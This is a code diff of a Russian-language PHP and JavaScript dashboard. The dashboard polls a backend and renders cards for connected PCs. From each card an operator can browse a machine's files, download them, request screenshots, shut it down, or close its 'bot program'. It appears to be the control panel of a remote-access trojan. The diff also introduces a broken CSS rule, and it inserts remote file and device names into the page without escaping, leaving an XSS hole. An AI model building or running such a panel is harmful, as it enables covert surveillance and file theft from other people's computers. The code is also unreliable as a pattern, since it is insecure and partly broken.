@@ -13,9 +13,8 @@ if (!is_dir($cache_dir)) mkdir($cache_dir, 0777, true);
 if (isset($_GET['api_refresh_all'])) {
     header('Content-Type: application/json');
     
-    // 1. Собираем данные проводника для каждого ПК
-    $explorer_data = [];
     $devices_raw = getData($api);
+    $explorer_data = [];
     
     foreach($devices_raw as $d) {
         $id = $d['device_id'] ?? '';
@@ -26,7 +25,18 @@ if (isset($_GET['api_refresh_all'])) {
         $last_file_ptr = $cache_dir . $id . '_lastfile.txt';
         $screen_file = __DIR__ . '/screenshots/screen_' . $id . '.jpg';
         
+        // Считаем статус Онлайн прямо тут
+        $time_raw = $d["time"] ?? ""; $last = 0;
+        if (!empty($time_raw)) {
+            if (preg_match('/(\d{2})\.(\d{2})\.(\d{4})\s(.*)/', $time_raw, $matches)) {
+                $time_raw = $matches[3] . "-" . $matches[2] . "-" . $matches[1] . " " . $matches[4];
+            } $last = @strtotime($time_raw);
+        }
+        $isOnline = ((time() - $last) <= 35 && $last > 0);
+
         $explorer_data[$id] = [
+            "name" => $d["name"] ?? "Неизвестный ПК",
+            "is_online" => $isOnline,
             "current_path" => file_exists($path_file) ? file_get_contents($path_file) : 'C:\\',
             "last_file" => file_exists($last_file_ptr) ? file_get_contents($last_file_ptr) : '',
             "items" => file_exists($tree_file) ? json_decode(file_get_contents($tree_file), true) : [],
@@ -35,11 +45,10 @@ if (isset($_GET['api_refresh_all'])) {
         ];
     }
     
-    // 2. Получаем свежие системные отчеты (логи)
     $logs = getData($api . "?get_logs=1");
     
     echo json_encode([
-        "explorer" => $explorer_data,
+        "devices" => $explorer_data,
         "logs" => $logs
     ]);
     exit;
@@ -86,10 +95,7 @@ if (isset($_GET['get_file']) && isset($_GET['dev'])) {
 if (isset($_GET['download_screen'])) {
     $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['download_screen']);
     $file = __DIR__ . '/screenshots/screen_' . $dev_id . '.jpg';
-    if (file_exists($file)) {
-        header('Content-Type: image/jpeg');
-        readfile($file);
-    } else { echo "Скриншот не найден."; }
+    if (file_exists($file)) { header('Content-Type: image/jpeg'); readfile($file); } else { echo "Скриншот не найден."; }
     exit;
 }
 
@@ -114,13 +120,12 @@ function getData($url) {
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_TIMEOUT, 5); 
     $res = curl_exec($ch); curl_close($ch); return json_decode($res, true) ?: [];
 }
-$devices = getData($api);
 ?>
 <!DOCTYPE html>
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
-<title>Панель Управления REALTIME PRO</title>
+<title>Панель Управления REALTIME СВЕРХСКОРОСТЬ</title>
 <style>
 body{ margin:0; font-family:system-ui, sans-serif; background:#090d16; color:#e2e8f0; padding-bottom:50px;}
 .header{ padding:18px 24px; background:#0f172a; border-bottom:1px solid #1e293b; font-weight:bold; font-size:19px; display:flex; justify-content:space-between; align-items:center;}
@@ -128,10 +133,10 @@ body{ margin:0; font-family:system-ui, sans-serif; background:#090d16; color:#e2
 .dot{ width:8px; height:8px; background:#34d399; border-radius:50%; margin-right:8px; display:inline-block; animation: pulse 1s infinite; }
 @keyframes pulse { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
 .container{ padding:24px; display:grid; grid-template-columns:repeat(auto-fill,minmax(360px,1fr)); gap:20px; }
-.card{ background:#111827; border:1px solid #1f2937; border-radius:14px; padding:20px;}
+.card{ background:#111827; border:1px solid #1f2937; border-radius:14px; padding:20px; transition: 0.3s;}
 .online-card { border-color: #064e3b; box-shadow: 0 4px 20px rgba(4,120,87,0.15); }
 .name{ font-weight:700; font-size:17px; margin-bottom:6px; color:#f8fafc;}
-.status{ font-size:11px; padding:4px 10px; border-radius:999px; display:inline-block; font-weight:bold; text-transform:uppercase;}
+.status{ font-size:11px; padding:4px 10px; border-radius999px; display:inline-block; font-weight:bold; text-transform:uppercase;}
 .online { background:#064e3b; color:#34d399; } .offline { background:#374151; color:#9ca3af; }
 .row{ margin-top:10px; font-size:13px; color:#94a3b8; word-break: break-all;}
 button, .btn-link{ width:100%; margin-top:8px; padding:10px; border-radius:8px; border:none; cursor:pointer; font-weight:600; display:block; text-align:center; box-sizing:border-box; text-decoration:none; font-size:13px; transition: 0.2s;}
@@ -148,59 +153,17 @@ button, .btn-link{ width:100%; margin-top:8px; padding:10px; border-radius:8px; 
 table{ width:100%; border-collapse:collapse; font-size:13px;}
 th, td{ padding:12px; border-bottom:1px solid #1f2937; text-align:left;}
 th { color: #64748b; font-size: 11px; text-transform: uppercase;}
-</value>
 </style>
 </head>
 <body>
 
 <div class="header">
-    <span>🖥 Центральная Панель Управления [FULL REALTIME V3]</span>
-    <div class="sync-indicator"><span class="dot"></span>Полный AJAX-мониторинг (1.5с)</div>
+    <span>🖥 Центральная Панель Управления [INFINITY REALTIME]</span>
+    <div class="sync-indicator"><span class="dot"></span>Авто-обнаружение новых ПК (1.5с)</div>
 </div>
 
-<div class="container">
-    <?php 
-    foreach($devices as $d): 
-        $dev_id = $d["device_id"] ?? ""; if (empty($dev_id)) continue;
-        $time_raw = $d["time"] ?? ""; $last = 0;
-        if (!empty($time_raw)) {
-            if (preg_match('/(\d{2})\.(\d{2})\.(\d{4})\s(.*)/', $time_raw, $matches)) {
-                $time_raw = $matches[3] . "-" . $matches[2] . "-" . $matches[1] . " " . $matches[4];
-            } $last = @strtotime($time_raw);
-        }
-        $isOnline = ((time() - $last) <= 35 && $last > 0);
-    ?>
-    <div class="card <?=($isOnline?"online-card":"")?>" id="card_<?=$dev_id?>">
-        <div class="name"><?=htmlspecialchars($d["name"] ?? "Неизвестный ПК")?></div>
-        <div class="status <?=($isOnline?"online":"offline")?>"><?=($isOnline?"В сети":"Не в сети")?></div>
-        <div class="row"><b>ID железа:</b> <span style="font-family:monospace;"><?=$dev_id?></span></div>
-
-        <hr style="border-color:#1f2937; margin:12px 0;">
-
-        <div class="name" style="font-size:14px; margin-top:10px;">📂 Онлайн Проводник ПК:</div>
-        <span id="path_text_<?=$dev_id?>" style="font-size:11px; color:#64748b; font-family:monospace; display:block; margin-bottom:4px;">Синхронизация...</span>
-
-        <button type="button" class="blue" style="background:#0284c7; margin:0;" onclick="sendCmdAsync('<?=$dev_id?>', 'get_files', 'C:\\\\')">🔄 Обновить / Корень диска C:</button>
-
-        <div class="explorer-box" id="explorer_box_<?=$dev_id?>">
-            <span style='font-size:11px; color:#4b5563;'>Загрузка структуры...</span>
-        </div>
-
-        <div id="download_container_<?=$dev_id?>"></div>
-
-        <hr style="border-color:#1f2937; margin:15px 0;">
-
-        <button type="button" class="blue" onclick="sendCmdAsync('<?=$dev_id?>', 'take_screenshot')">📸 Запросить Скриншот</button>
-        
-        <div id="screenshot_container_<?=$dev_id?>"></div>
-
-        <hr style="border-color:#1f2937; margin:15px 0;">
-
-        <button type="button" class="orange" onclick="if(confirm('Закрыть программу бота?')) sendCmdAsync('<?=$dev_id?>', 'stop_client')">❌ Закрыть программу бота</button>
-        <button type="button" class="red" onclick="if(confirm('Выключить ПК?')) sendCmdAsync('<?=$dev_id?>', 'shutdown')">💻 Выключить компьютер</button>
-        <button type="button" class="gray-danger" onclick="if(confirm('Забыть ПК?')) sendCmdAsync('<?=$dev_id?>', 'delete')">🗑 Забыть ПК (Удалить)</button>
-    </div>
-    <?php endforeach; ?>
+<div class="container" id="devices_container">
+    <div style="color:#4b5563; grid-column: 1/-1; text-align:center; padding:40px;">Ожидание подключения первого ПК...</div>
 </div>
 
 <div class="log-section">
@@ -221,77 +184,100 @@ th { color: #64748b; font-size: 11px; text-transform: uppercase;}
 </div>
 
 <script>
-// Фоновая отправка команд боту без перезагрузки страницы
 function sendCmdAsync(deviceId, action, targetPath = '') {
     let formData = new FormData();
     formData.append('action', action);
     formData.append('device_id', deviceId);
     formData.append('target_path', targetPath);
     formData.append('js_async', '1');
-
-    fetch(window.location.href, { method: 'POST', body: formData })
-    .then(() => console.log('Команда отправлена:', action))
-    .catch(err => console.error(err));
+    fetch(window.location.href, { method: 'POST', body: formData }).catch(err => console.error(err));
 }
 
-// ГЛАВНЫЙ СУПЕР-ТАЙМЕР: ПОЛНЫЙ МОНИТОРИНГ ВСЕГО НА СВЕТЕ РАЗ В 1.5 СЕКУНДЫ
 function startRealtimeMonitor() {
     setInterval(() => {
         fetch('?api_refresh_all=1')
         .then(res => res.json())
         .then(data => {
             
-            // 1. ОБНОВЛЯЕМ КАЖДЫЙ ПК (Проводник, файлы, скриншоты)
-            for (let id in data.explorer) {
-                let pc = data.explorer[id];
+            // 1. ДИНАМИЧЕСКИЙ РЕНДЕРИНГ КАРТОЧЕК ПК
+            let container = document.getElementById('devices_container');
+            let hasDevices = Object.keys(data.devices).length > 0;
+            
+            if (!hasDevices) {
+                container.innerHTML = `<div style="color:#4b5563; grid-column:1/-1; text-align:center; padding:40px;">Нет активных ПК в базе данных...</div>`;
+            } else {
+                // Собираем HTML для всех карточек
+                let containerHtml = '';
                 
-                // Путь текста
-                let pathEl = document.getElementById('path_text_' + id);
-                if(pathEl) pathEl.innerText = 'Путь: ' + pc.current_path;
-
-                // Дерево Проводника
-                let box = document.getElementById('explorer_box_' + id);
-                if (box) {
-                    let html = '';
+                for (let id in data.devices) {
+                    let pc = data.devices[id];
+                    let cardClass = pc.is_online ? 'card online-card' : 'card';
+                    let statusClass = pc.is_online ? 'status online' : 'status offline';
+                    let statusText = pc.is_online ? 'В сети' : 'Не в сети';
+                    
+                    // Генерируем элементы проводника
+                    let explorerHtml = '';
                     if (pc.current_path !== 'C:\\' && pc.current_path !== 'C:/' && pc.current_path !== '') {
                         let parts = pc.current_path.split(/[\\\/]/); parts.pop(); if(parts.length <= 1) parts = ['C:'];
                         let parentPath = parts.join('\\\\'); if(!parentPath.endsWith('\\')) parentPath += '\\\\';
-                        html += `<div class="exp-item"><button type="button" class="exp-btn" style="color:#f59e0b;" onclick="sendCmdAsync('${id}', 'get_files', '${parentPath}')">📁 .. [Назад]</button></div>`;
+                        explorerHtml += `<div class="exp-item"><button type="button" class="exp-btn" style="color:#f59e0b;" onclick="sendCmdAsync('${id}', 'get_files', '${parentPath}')">📁 .. [Назад]</button></div>`;
                     }
 
                     if (!pc.items || pc.items.length === 0) {
-                        html += `<span style='font-size:11px; color:#4b5563;'>Нажмите кнопку Обновить выше</span>`;
+                        explorerHtml += `<span style='font-size:11px; color:#4b5563;'>Нажмите кнопку Обновить выше</span>`;
                     } else {
                         pc.items.forEach(item => {
                             let safePath = item.path.replace(/\\/g, '\\\\');
                             if (item.is_dir) {
-                                html += `<div class="exp-item"><button type="button" class="exp-btn" onclick="sendCmdAsync('${id}', 'get_files', '${safePath}')">📁 ${item.name}</button></div>`;
+                                explorerHtml += `<div class="exp-item"><button type="button" class="exp-btn" onclick="sendCmdAsync('${id}', 'get_files', '${safePath}')">📁 ${item.name}</button></div>`;
                             } else {
-                                html += `<div class="exp-item"><button type="button" class="exp-btn" style="color:#10b981;" onclick="if(confirm('Скачать этот файл?')) sendCmdAsync('${id}', 'download_file', '${safePath}')">📄 ${item.name}</button><span style="font-size:10px; color:#4b5563;">${item.size}</span></div>`;
+                                explorerHtml += `<div class="exp-item"><button type="button" class="exp-btn" style="color:#10b981;" onclick="if(confirm('Скачать этот файл?')) sendCmdAsync('${id}', 'download_file', '${safePath}')">📄 ${item.name}</button><span style="font-size:10px; color:#4b5563;">${item.size}</span></div>`;
                             }
                         });
                     }
-                    box.innerHTML = html;
-                }
 
-                // Кнопка выкачивания файла на свой ПК
-                let dlContainer = document.getElementById('download_container_' + id);
-                if (dlContainer) {
+                    // Кнопка скачивания файла
+                    let downloadBtnHtml = '';
                     if (pc.last_file && pc.last_file.trim() !== '') {
-                        dlContainer.innerHTML = `<a href="?get_file=${encodeURIComponent(pc.last_file)}&dev=${id}" class="btn-link green" style="background:#10b981; margin-top:8px; box-shadow: 0 0 12px rgba(16,185,129,0.5);">💾 Скачать на свой ПК: ${pc.last_file}</a>`;
-                    } else { dlContainer.innerHTML = ''; }
-                }
+                        downloadBtnHtml = `<a href="?get_file=${encodeURIComponent(pc.last_file)}&dev=${id}" class="btn-link green" style="background:#10b981; margin-top:8px; box-shadow: 0 0 12px rgba(16,185,129,0.5);">💾 Скачать на свой ПК: ${pc.last_file}</a>`;
+                    }
 
-                // Живое отображение Скриншотов (добавляем timestamp v=..., чтобы браузер не кэшировал старую картинку)
-                let scrContainer = document.getElementById('screenshot_container_' + id);
-                if (scrContainer) {
+                    // Скриншот кнопка
+                    let screenshotBtnHtml = '';
                     if (pc.has_screenshot) {
-                        scrContainer.innerHTML = `<a href="?download_screen=${id}&v=${pc.screenshot_time}" class="btn-link green" target="_blank" style="margin-bottom:6px; background:#4f46e5;">📥 Посмотреть скриншот экрана (Обновлен)</a>`;
-                    } else { scrContainer.innerHTML = ''; }
+                        screenshotBtnHtml = `<a href="?download_screen=${id}&v=${pc.screenshot_time}" class="btn-link green" target="_blank" style="margin-bottom:6px; background:#4f46e5;">📥 Посмотреть скриншот экрана</a>`;
+                    }
+
+                    // Сборка всей карточки устройства
+                    containerHtml += `
+                    <div class="${cardClass}">
+                        <div class="name">${pc.name}</div>
+                        <div class="${statusClass}">${statusText}</div>
+                        <div class="row"><b>ID железа:</b> <span style="font-family:monospace;">${id}</span></div>
+                        <hr style="border-color:#1f2937; margin:12px 0;">
+                        <div class="name" style="font-size:14px; margin-top:10px;">📂 Онлайн Проводник ПК:</div>
+                        <span style="font-size:11px; color:#64748b; font-family:monospace; display:block; margin-bottom:4px;">Путь: ${pc.current_path}</span>
+                        <button type="button" class="blue" style="background:#0284c7; margin:0;" onclick="sendCmdAsync('${id}', 'get_files', 'C:\\\\')">🔄 Обновить / Корень диска C:</button>
+                        <div class="explorer-box">${explorerHtml}</div>
+                        <div>${downloadBtnHtml}</div>
+                        <hr style="border-color:#1f2937; margin:15px 0;">
+                        <button type="button" class="blue" onclick="sendCmdAsync('${id}', 'take_screenshot')">📸 Запросить Скриншот</button>
+                        <div>${screenshotBtnHtml}</div>
+                        <hr style="border-color:#1f2937; margin:15px 0;">
+                        <button type="button" class="orange" onclick="if(confirm('Закрыть программу бота?')) sendCmdAsync('${id}', 'stop_client')">❌ Закрыть программу бота</button>
+                        <button type="button" class="red" onclick="if(confirm('Выключить ПК?')) sendCmdAsync('${id}', 'shutdown')">💻 Выключить компьютер</button>
+                        <button type="button" class="gray-danger" onclick="if(confirm('Забыть ПК?')) sendCmdAsync('${id}', 'delete')">🗑 Забыть ПК (Удалить)</button>
+                    </div>`;
+                }
+                
+                // Чтобы не сбрасывать фокус/скролл, обновляем контейнер только если изменился внутренний HTML структурно
+                if (container.dataset.lastHtml !== containerHtml) {
+                    container.innerHTML = containerHtml;
+                    container.dataset.lastHtml = containerHtml;
                 }
             }
 
-            // 2. ОБНОВЛЯЕМ ТАБЛИЦУ ОТЧЕТОВ (ЛОГОВ) ЖИВЬЕМ
+            // 2. ОБНОВЛЯЕМ ТАБЛИЦУ ОТЧЕТОВ (ЛОГОВ)
             let logsBody = document.getElementById('live_logs_body');
             if (logsBody && data.logs) {
                 let logsHtml = '';
@@ -310,10 +296,9 @@ function startRealtimeMonitor() {
                 }
                 logsBody.innerHTML = logsHtml;
             }
-
         })
-        .catch(err => console.error("Ошибка глобального realtime-мониторинга:", err));
-    }, 1500); // Опрос раз в 1.5 секунды
+        .catch(err => console.error("Ошибка:", err));
+    }, 1500);
 }
 
 window.onload = startRealtimeMonitor;
